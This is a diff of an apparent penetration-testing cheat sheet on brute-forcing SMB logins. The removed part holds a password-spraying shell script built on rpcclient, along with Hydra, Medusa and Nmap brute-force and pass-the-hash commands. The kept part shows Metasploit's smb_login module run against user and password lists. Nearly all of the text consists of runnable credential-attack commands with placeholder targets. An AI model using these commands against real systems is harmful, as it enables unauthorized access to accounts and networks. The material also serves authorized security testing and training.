@@ -1,47 +1,4 @@
-# SMB & NETBIOS
-
-## 01 - Manual
-
-`$ cat password-spraying.sh`
-
----
-
-```bash
-#!/bin/sh
-
-for username in `cat $1`
-do
-    echo -n "[*] user: $username" && rpcclient -U "$username%$2" -c "getusername;quit" $3
-done
-```
-
-`$ chmod +x password-spraying.sh`
-
-`$ ./password-spraying.sh users.lst <password> <IP>`
-
-## 02 - Hydra
-
-`$ hydra -U smb`
-
-`$ hydra -l Administrator -p <password> smb://<IP>`
-
-- Pass the Hash
-
-`$ hydra -l <username> -p <nt_hash> -m "" <IP> smb`
-
-`$ hydra -l <username> -p <lm_hash>:<nt_hash> <IP> -m "LocalHash" smb`
-
-## 03 - Medusa
-
-TODO: Show syntax for brute forcing SMB with Medusa
-
-`$ medusa -u <username>`
-
-- Pass the Hash
-
-`$ medusa -u <username> -p <lm_hash>:<nt_hash> -h <IP> -M smbnt -m PASS:HASH`
-
-## 04 - Metasploit
+# Metasploit
 
 - You can actually use NTLM hashes to pass the hash
 
@@ -79,15 +36,11 @@ Module options (auxiliary/scanner/smb/smb_login):
    USER_FILE                           no        File containing usernames, one per line
    VERBOSE            true             yes       Whether to print output for all attempts
 
-msf auxiliary(scanner/smb/smb_login) > set user_file /path/to/users.lst
+msf auxiliary(scanner/smb/smb_login) > set user_file users.lst
 
-msf auxiliary(scanner/smb/smb_login) > set pass_file /path/to/passwords.txt
+msf auxiliary(scanner/smb/smb_login) > set pass_file passwords.lst
 
 msf auxiliary(scanner/smb/smb_login) > set threads 8
 
 msf auxiliary(scanner/smb/smb_login) > run
 ```
-
-## 05 - Nmap
-
-`$ nmap -p 445 --script smb-brute --script-args smbtype=<version> <IP>`
